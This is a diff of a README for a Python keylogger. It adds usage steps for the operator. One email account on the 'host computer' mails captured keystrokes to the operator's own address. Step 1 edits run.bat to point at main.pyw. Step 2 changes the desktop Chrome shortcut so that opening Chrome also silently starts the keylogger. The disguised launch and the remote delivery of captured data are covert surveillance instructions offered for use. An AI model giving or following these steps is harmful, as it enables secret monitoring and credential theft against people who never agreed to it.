@@ -7,12 +7,20 @@ Keylog is created in python 2.7 with famous modules like pyHook and pythoncom. K
 
 Installation:
 ------------------
-''' $ git clone https://github.com/farasatkhan/Keylog.git'''
+$ git clone https://github.com/farasatkhan/Keylog.git
 
 
 Usage:
 ------------------
-Add your ceredentials where necessary e.g, You would need two emails in order to program work. 
+You would need to add your credentials where necessary. You would be asked to provide two separate emails. One in the host computer which sent the data to the other email (Your email).
+
+Optional: You can also attach the file with the chrome.exe file.
+
+Step 1:
+Open the run.bat file in your Text editor. Add the location of the main.pyw file and If you are using chrome 64 bit you might also have to changed the chrome location.
+
+Step 2:
+Go to the properties of chrome icon in the desktop and change the Target to run the run.bat file. It will launch main.pyw file as well as chrome.exe.
 
 Authors:
 ------------------
